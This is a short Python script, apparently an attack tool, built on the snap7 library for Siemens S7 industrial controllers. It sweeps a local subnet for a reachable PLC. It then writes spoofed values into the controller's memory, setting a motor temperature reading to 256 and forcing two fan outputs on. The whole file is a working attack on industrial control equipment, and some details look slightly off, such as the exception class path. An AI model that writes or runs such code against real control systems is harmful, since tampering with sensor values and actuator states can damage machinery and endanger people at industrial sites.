import socket
import random
import snap7

# Function to find the PLC's IP address
def find_plc_ip():
    # Assuming the PLC is on the same network as the Windows machine
    # and the subnet mask is 255.255.255.0
    for i in range(1, 255):
        ip = f"192.168.1.{i}"
        try:
            client = snap7.S7Client()
            client.ConnectTo(ip, 0, 1)
            client.Disconnect()
            return ip
        except snap7.snap7exceptions.S7ConnectionException:
            pass
    return None

# Function to send spoofed reporting messages
def send_spoofed_message(plc_ip):
    # Assuming the reporting message format is a simple string
    # with the format "DEVICE_ID:VALUE"
    client = snap7.S7Client()
    client.ConnectTo(plc_ip, 0, 1)
    
    # Spoof Motor_Temp value
    client.WriteArea(snap7.s7const.S7AreaDB, 1, 0, b'\x00\x00\x01\x00')  # Set Motor_Temp to 256
    
    # Spoof Activate_Fan_A value
    client.WriteArea(snap7.s7const.S7AreaPE, 0, 0, b'\x01')  # Set Activate_Fan_A to TRUE
    
    # Spoof Activate_Fan_B value
    client.WriteArea(snap7.s7const.S7AreaPE, 0, 1, b'\x01')  # Set Activate_Fan_B to TRUE
    
    client.Disconnect()

# Main function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"PLC IP address found: {plc_ip}")
        send_spoofed_message(plc_ip)
    else:
        print("PLC IP address not found")

if __name__ == "__main__":
    main()